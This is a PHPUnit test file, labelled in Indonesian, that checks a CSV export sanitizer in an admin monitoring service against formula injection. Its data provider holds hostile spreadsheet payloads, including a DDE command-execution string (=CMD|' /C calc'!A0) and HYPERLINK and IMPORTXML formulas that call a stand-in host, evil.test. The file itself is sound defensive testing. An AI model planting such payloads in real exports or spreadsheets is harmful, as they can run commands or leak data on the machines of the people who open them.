<?php

namespace Tests\Unit\Services;

use App\Services\AdminMonitoringService;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class AdminMonitoringCsvSanitizerTest extends TestCase
{
    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function formulaPayloadProvider(): array
    {
        return [
            'awalan sama dengan' => ['=1+1', "'=1+1"],
            'awalan fungsi CMD' => ["=CMD|' /C calc'!A0", "'=CMD|' /C calc'!A0"],
            'awalan plus' => ['+SUM(A1:A5)', "'+SUM(A1:A5)"],
            'awalan minus' => ['-2+3', "'-2+3"],
            'awalan at' => ['@HYPERLINK("https://evil.test")', "'@HYPERLINK(\"https://evil.test\")"],
            'awalan tab' => ["\t=1+1", "'\t=1+1"],
            'awalan carriage return' => ["\r=1+1", "'\r=1+1"],
            'awalan newline' => ["\n=1+1", "'\n=1+1"],
            'spasi sebelum sama dengan' => ['   =IMPORTXML("https://evil.test","//a")', "'   =IMPORTXML(\"https://evil.test\",\"//a\")"],
            'spasi sebelum plus' => ['  +1+1', "'  +1+1"],
        ];
    }

    #[DataProvider('formulaPayloadProvider')]
    public function test_menetralkan_payload_formula_injection_dengan_apostrof(string $input, string $expected): void
    {
        $this->assertSame($expected, AdminMonitoringService::sanitizeCsvCell($input));
    }

    public function test_mempertahankan_teks_biasa_angka_dan_nilai_kosong(): void
    {
        $this->assertSame('', AdminMonitoringService::sanitizeCsvCell(null));
        $this->assertSame('', AdminMonitoringService::sanitizeCsvCell(''));
        $this->assertSame('0', AdminMonitoringService::sanitizeCsvCell(0));
        $this->assertSame('14200000', AdminMonitoringService::sanitizeCsvCell(14_200_000));
        $this->assertSame('12.5', AdminMonitoringService::sanitizeCsvCell(12.5));
        $this->assertSame('Bandung Kota', AdminMonitoringService::sanitizeCsvCell('Bandung Kota'));
        $this->assertSame('Bank Sampah RW 05 - Dago', AdminMonitoringService::sanitizeCsvCell('Bank Sampah RW 05 - Dago'));
    }

    public function test_menetralkan_satu_baris_csv_sekaligus(): void
    {
        $row = AdminMonitoringService::sanitizeCsvRow([
            'Per Wilayah & Hub',
            '=Jawa Barat',
            '+Hub Bahaya',
            5,
            'Tidak diketahui',
        ]);

        $this->assertSame([
            'Per Wilayah & Hub',
            "'=Jawa Barat",
            "'+Hub Bahaya",
            '5',
            'Tidak diketahui',
        ], $row);
    }
}
